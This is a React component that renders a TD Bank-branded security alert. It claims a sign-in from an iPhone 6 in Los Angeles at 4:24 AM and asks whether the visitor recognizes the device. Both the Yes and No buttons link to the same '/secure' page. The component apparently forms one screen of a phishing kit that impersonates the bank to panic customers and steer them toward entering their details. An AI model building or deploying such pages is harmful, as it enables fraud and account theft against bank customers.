import { Box, Text, Image, Heading, Center, Button, Link } from '@chakra-ui/react'

function Security() {
  return (
    <Box>
    
      <Box minH="72.3vh">
        
        <Box fontFamily={'Poppins'} >
        
            <Center>
            <Image mt={10} w={320} src={'./images/td1.png'} />
            
            </Center>
            <Box>
          <Heading px={4} fontFamily={'Poppins'} textAlign="center" pt={7} fontWeight="semibold" as="h2" fontSize="26" color="blackAlpha.800">
            Alert
          </Heading>
        </Box>
            <Text textAlign={'center'} fontWeight={'normal'} mt={4} p={4} fontSize="15px" color="blackAlpha.800">
                          You've signed on to TD Bank via iPhone 6 located in Los Angeles, California, today at<br /> 4:24 AM. 
                        </Text>
                        <Text fontWeight={'semibold'} textAlign={'center'} mt={4} p={4} fontSize="15px" color="blackAlpha.800">
                          Do you recognize this device?
                        </Text>
        </Box>          
          <Box fontFamily={'Poppins'} p={4}>
            <Link href='/secure'>
          <Button  mt={0}  mb={4} h={12}  _hover={{ bg: '#526f30', color: 'whitesmoke', borderRadius: 2 }}  bgColor="#47A040" color="whitesmoke" borderRadius={0} w="100%">
            Yes
          </Button>
          </Link>
          <Link href='/secure'>
          <Button mt={2} h={12}  _hover={{ bg: '#526f30', color: 'whitesmoke', borderRadius: 2 }}  bgColor="#47A040" color="whitesmoke" borderRadius={0} w="100%">
            No
          </Button>
          </Link>
          </Box>
        </Box>
      </Box>
   
  )
}

export default Security;
